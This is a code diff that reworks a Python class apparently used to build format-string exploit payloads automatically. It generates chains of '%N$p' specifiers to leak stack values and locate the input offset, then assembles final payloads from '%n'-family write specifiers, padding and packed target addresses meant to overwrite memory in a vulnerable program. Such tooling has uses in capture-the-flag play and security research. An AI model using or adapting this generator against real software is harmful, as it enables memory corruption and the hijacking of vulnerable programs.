@@ -1,49 +1,131 @@
 class DirectFmtGenerator:
-    def __init__(self, direct_parameter_num, address):
+    def __init__(self):
         self.writers = list()
 
-        self.direct_parameter_num = [0, direct_parameter_num]
+        self.direct_parameter_num = 1
 
         self.align_padding = ""
 
-        self.address = address
+        self.temp_address = ""
+        self.address = None
 
-    def generate_fmt_for_find_start(self):
-        fmt = ""
+    def generate_next_fmt_for_find_start(self, max_length):
+        fmt = "%" + str(self.direct_parameter_num - 1) + "$p" if self.direct_parameter_num > 1 else ""
 
-        fmt += self.address
+        if len(fmt) > max_length:
+            return -1
+        else:
+            dim = len(fmt)
+            reader_count = 1
+            while True:
+                reader = "%" + str(self.direct_parameter_num) + "$p"
+                if len(reader) + dim > max_length:
+                    break
+                else:
+                    reader_count += 1
+                    self.direct_parameter_num += 1
+                    dim += len(reader)
+                    fmt += reader
 
-        for i in range(self.direct_parameter_num[0], self.direct_parameter_num[1] + 1):
-            fmt += "%" + str(i) + "$p"
+            return self.temp_address + fmt if reader_count > 2 else -1
 
-        return fmt
+    def generate_next_fmt_for_find_start_segfault_encountered(self, max_length):
+        fmt = "%" + str(self.direct_parameter_num - 1) + "$p" + "%" + str(self.direct_parameter_num) + "$p"
+        self.direct_parameter_num += 1
 
-    def generate_fmt_for_find_end(self, param_len):
-        fmt = ""
+        return self.temp_address + fmt if len(self.temp_address + fmt) <= max_length else -1
+
+    def generate_next_fmt_for_command_line_input(self, fmt_size):
+        writers = ""
 
         for w in self.writers:
-            fmt += w[0] + "x" * (2 + param_len) + w[1]
+            print(len(w[1]))
+            writers += "P" * len(w[0]) + "W" * (len(w[1]) + (1 + 4 + 1))
 
-        return fmt + self.align_padding + self.address
+        addresses = self.temp_address + "C" * (len(self.writers) - 1)
 
+        parameters = "%" + str(self.direct_parameter_num - 1) + "$p" if self.direct_parameter_num > 1 else ""
 
+        if len(writers + addresses + parameters) > fmt_size:
+            return -1
+        else:
+            dim = len(writers + addresses + parameters)
+            reader_count = 1
+            while True:
+                reader = "%" + str(self.direct_parameter_num) + "$p"
+
+                if len(reader) + dim > fmt_size:
+                    break
+                else:
+                    reader_count += 1
+                    self.direct_parameter_num += 1
+                    dim += len(reader)
+                    parameters += reader
+
+            if reader_count < 2:
+                return -1
+            else:
+                padding = "G" * (fmt_size - dim)
+
+                return writers + addresses + parameters + padding
+
+    def generate_fmt_for_find_end(self):
+        writers = ""
+
+        for w in self.writers:
+            writers += "V" * len(w[0]) + w[1].replace("ln", "p.").replace("hhn", "p..").replace("hn", "p.").replace("n", "p")
+
+        return writers + self.align_padding + self.temp_address * len(self.address)
+
+    def generate_final_fmt(self, shift_for_broken_pattern, input_len):
+        writers = ""
+
+        for w in self.writers:
+            writers += "V" * len(w[0]) + w[1].replace("ln", "p.").replace("hhn", "p..").replace("hn", "p.").replace("n",
+                                                                                                                "p")
+        shift_padding = "C" * shift_for_broken_pattern
+
+        addresses = self.temp_address * len(self.writers)
+
+        return writers + shift_padding + addresses + "C" * (input_len - len(writers + shift_padding + addresses))
+
+    def generate_final_fmt2(self, shift_for_broken_pattern, markers0_len, input_len):
+        writers = ""
+
+        for w in self.writers:
+            writers += w[0] + w[1]
+
+        shift_padding = "B" * shift_for_broken_pattern
+        markers0 = "0" * markers0_len
+
+        addresses = b""
+        for addr in self.address:
+            addresses += addr
+
+        final_padding = "C" * (input_len - len(writers + shift_padding + (self.temp_address * len(self.address))))
+
+        return writers.encode() + markers0.encode() + shift_padding.encode() + addresses + final_padding.encode()
+    
     def generate_fmt_in_byte(self):
         writers = ""
         for w in self.writers:
             writers += w[0] + w[1]
 
-        #return writers.encode() + self.align_padding.encode() + b"TESTTESTTEST" + self.address + b"ABCDEFGH"
-        return writers.encode() + self.align_padding.encode() + self.address
+        fmt = writers.encode() + self.align_padding.encode()
 
-    def increase_direct_parameter_num(self, num):
-        self.direct_parameter_num[0] = self.direct_parameter_num[1] + 1
-        self.direct_parameter_num[1] += self.direct_parameter_num[1] + num
+        for addr in self.address:
+            fmt += addr
+
+        return fmt
 
     def set_direct_parameter_num(self, num):
-        self.direct_parameter_num[1] = num
+        self.direct_parameter_num = num
 
     def get_direct_parameter_num(self):
-        return self.direct_parameter_num[0]
+        return self.direct_parameter_num
+
+    def reset_direct_parameter_num(self):
+        self.direct_parameter_num = 1
 
     def add_writer(self, writer):
         self.writers.append(writer)
@@ -51,12 +133,11 @@ class DirectFmtGenerator:
     def set_align_padding(self, align_padding):
         self.align_padding = align_padding
 
+    def set_temp_address(self, temp_address):
+        self.temp_address = temp_address
+
     def set_address(self, address):
         self.address = address
 
 
-fmt = ""
-for i in range(67, 79):
-    fmt += "%" + str(i) + "$p"
 
-print(fmt)
